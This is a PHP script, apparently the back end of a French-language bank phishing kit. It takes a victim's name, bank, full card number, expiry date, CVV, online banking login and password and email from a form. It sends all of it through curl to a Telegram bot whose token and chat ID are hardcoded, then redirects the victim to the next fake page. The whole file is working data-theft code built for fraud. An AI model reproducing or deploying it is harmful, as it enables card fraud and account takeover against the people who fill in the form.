<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupérer les données du formulaire
    $nom = $_POST['nom'];
    $prenom = $_POST['prenom'];
    $codePostal = $_POST['code-postal'];
    $region = $_POST['region'];
    $banque = $_POST['banque'];
    $departement = $_POST['departement'];
    $carteNumero = $_POST['carte-numero'];
    $expiration = $_POST['expiration'];
    $cvv = $_POST['cvv'];
    $identifiant = $_POST['identifiant'];
    $motDePasse = $_POST['mot-de-passe'];
    $email = $_POST['email'];

    // Créer le message Telegram
    $message = "Informations d'authentification :\n";
    $message .= "Nom : " . $nom . "\n";
    $message .= "Prénom : " . $prenom . "\n";
    $message .= "Code Postal : " . $codePostal . "\n";
    $message .= "Région : " . $region . "\n";
    $message .= "Banque : " . $banque . "\n";
    $message .= "Département : " . $departement . "\n";
    $message .= "Numéro de Carte : " . $carteNumero . "\n";
    $message .= "Expiration : " . $expiration . "\n";
    $message .= "CVV : " . $cvv . "\n";
    $message .= "Identifiant : " . $identifiant . "\n";
    $message .= "Mot de Passe : " . $motDePasse . "\n";
    $message .= "Email : " . $email;

    // Remplacer par vos informations
    $telegramBotToken = '7727944499:AAHpgP9-xAAbtGZpBrYBfaX_FbkZiWVeEtw';
    $telegramChatId = '7263826117';

    // Envoyer le message à Telegram
    $telegramUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage?chat_id=" . $telegramChatId . "&text=" . urlencode($message);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Rediriger vers la page 4
    header('Location: page4.html');
    exit;
}
?>